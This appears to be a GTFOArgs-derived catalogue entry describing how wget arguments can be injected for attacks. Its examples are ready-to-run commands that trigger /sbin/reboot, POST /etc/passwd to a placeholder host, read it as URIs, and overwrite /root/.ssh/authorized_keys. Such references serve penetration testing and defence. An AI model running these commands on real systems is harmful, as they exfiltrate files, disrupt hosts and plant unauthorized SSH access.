---
trust_level: community
id: argument-injection-wget
namespace: argument:injection:wget
name: wget
description: Argument injection via wget
version: 1.0.0
capabilities:
- security.execution.command
- network.transfer.upload
- system.file.read
- system.file.write
- network.transfer.download
platforms:
- cross-platform
techniques:
- execution
- exfiltration
- discovery
execution:
  template: wget
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
- description: Can be used to execute any command or file on a system, but without
    any arguments, and without stdout/stderr. This can be useful if you are able to
    write an executable to the server beforehand. The example here invokes /sbin/reboot.
  command: 'wget --use-askpass=/sbin/reboot http://0/ '
- description: Send a local file to a remote server in a POST request. Note that the
    file will be sent as-is.
  command: 'wget --post-file=/etc/passwd http://0/ '
- description: Read local files by importing the file as URIs to be retrieved. The
    content of the file will be displayed as error messages.
  command: 'wget --input-file=/etc/passwd http://0/ '
- description: Reads local data and writes the output to a file. This is only suitable
    for displaying non-binary files, as the output is an error-log.
  command: 'wget --input-file=/etc/passwd --output-file=/tmp/passwd.txt '
- description: Downloads a remote file via an HTTP GET request and saves it to a specific
    location.
  command: 'wget --output-document=/root/.ssh/authorized_keys http://0/ '
references:
- label: GTFOArgs
  url: https://gtfoargs.github.io/gtfoargs/wget/
features:
- file-system
- local
- network-intensive
- pipes-stdin
- stealth
---

# wget

GTFOArgs entry for wget. This binary can be used to inject arguments for execution, file operations, or other capabilities.
